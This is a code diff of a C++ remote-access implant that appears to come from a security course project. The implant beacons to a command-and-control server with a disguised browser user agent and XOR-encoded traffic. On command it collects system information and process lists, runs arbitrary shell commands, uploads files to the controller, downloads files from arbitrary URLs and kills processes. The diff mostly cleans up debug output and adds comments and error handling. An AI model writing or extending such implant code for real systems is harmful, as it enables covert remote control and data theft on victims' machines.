@@ -193,7 +193,10 @@ std::string send_enc(Configuration c, std::string data, std::string endpoint){
   curl_easy_setopt(c.curl, CURLOPT_POSTFIELDSIZE, result.length());
   curl_easy_setopt(c.curl, CURLOPT_POSTFIELDS, result.c_str());
   CURLcode res = curl_easy_perform(c.curl);
-
+  if(res != CURLE_OK) {
+    fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+    return "";
+  }
   std::string returnStr = c.readbuffer;
 
   //reset values and return
@@ -366,10 +369,8 @@ int main(void)
   std::string postfields = "";
   Endpoints e {.heartbeat="/heartbeat", .info="/info", .out="/out", .ps="/ps", .upload="/upload"};
   Configuration c {.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36", .cookiejarfile="/tmp/cookies.txt", .protocol="http", .hostname="127.0.0.1", .port=5000, .endpoints=e, .xorKey=0x7f, .key="CSEC476", .sleeptime=4, .cmdtimeout=10,.ipCheckUrl="http://ifconfig.me/ip", .readbuffer=readbuffer, postfields=postfields, .list=list, .curl=curl};
-  c.hostname = "129.21.62.93";
   std::string url = c.protocol + "://" + c.hostname + ":" + std::to_string(c.port) + c.endpoints.heartbeat;
   c.curl = curl_easy_init();
-
   if(c.curl) {
     list = curl_slist_append(list, "Content-Type: Data");
     curl_easy_setopt(c.curl, CURLOPT_URL, url.c_str());
@@ -391,14 +392,12 @@ int main(void)
 		get action code (1,2,3...etc)
 		switch atoi(action code)
     */
-
     while(1){
       res = curl_easy_perform(c.curl);
       /* Check for errors */
       if(res != CURLE_OK)
         fprintf(stderr, "curl_easy_perform() failed: %s\n",
                 curl_easy_strerror(res));
-      std::cout << "=============:)===============" << std::endl;
       std::string response = decode(c.key, c.readbuffer);
 
       std::string code = response.substr(0, response.find(" "));
@@ -407,38 +406,35 @@ int main(void)
       switch (atoi(code.c_str())){
       case 1:
         //OK
-        std::cout << "Recv 1" << std::endl;
         break;
       case 2:
-        std::cout << "Recv 2" << std::endl;
+        //Gather System Info
         send_enc(c, gatherSystemInfo(c), c.endpoints.info);
         break;
       case 3:
-        std::cout << "Recv 3" << std::endl;
-        std:: cout << processdir() << std::endl;
+        //Gather currently running processes
         send_enc(c, processdir(), c.endpoints.ps);
         break;
       case 4:
-        std::cout << "Recv 4" << std::endl;
+        //Execute command
 	send_enc(c, exec(response.substr(response.find(" ") + 1).c_str(), c.cmdtimeout), c.endpoints.out);
         break;
       case 5:
-        std::cout << "Recv 5" << std::endl;
-	std::cout << response.substr(response.find(" ") + 1).c_str() << std::endl;
+        //Upload file to C2
         uploadfile(c, response.substr(response.find(" ") + 1));
         break;
       case 6:
-        std::cout << "Recv 6" << std::endl;
+        //Dowload file from arbitrary URL
         first = response.find(" ");
         second = response.find(" ", first+1);
-        std::cout << response.substr(first+1, second-2) << response.substr(second+1) << std::endl;
         downloadFile(response.substr(first+1, second-2), response.substr(second+1));
         break;
       case 7:
-        std::cout << "Recv 7" << std::endl;
+        //Kill process
         kill(atoi(response.substr(response.find(" ") + 1).c_str()), SIGTERM);
         break;
       default:
+        //Unknown command
         std::cout << "Unknown command: " << response << std::endl;
         break;
       }
